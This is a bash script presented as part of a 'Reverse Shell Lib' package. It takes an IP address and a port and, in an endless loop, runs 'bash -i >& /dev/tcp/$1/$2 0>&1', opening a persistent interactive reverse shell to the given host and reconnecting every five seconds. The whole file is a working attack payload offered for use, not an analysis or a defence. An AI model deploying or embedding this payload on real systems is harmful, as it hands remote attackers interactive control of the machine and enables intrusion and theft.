#!/bin/bash

#  Copyright 2021 by Zackary Morvan, Cyber M Technologies.
#  All rights reserved
#  This file is part of the Reverse Shell Lib (RSL), and is released 
#  under the "MIT License Agreement". Please see the LICENSE file that
#  should have been included as a part of this package

if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  if [ -n $2 ] && [ $2 -eq $2 ] 2>/dev/null; then
    while true; do
        bash -i >& /dev/tcp/$1/$2 0>&1
        sleep 5
    done
  else
    echo "Invalid port for payload"
  fi

else
  echo "Invalid ip address for payload"
fi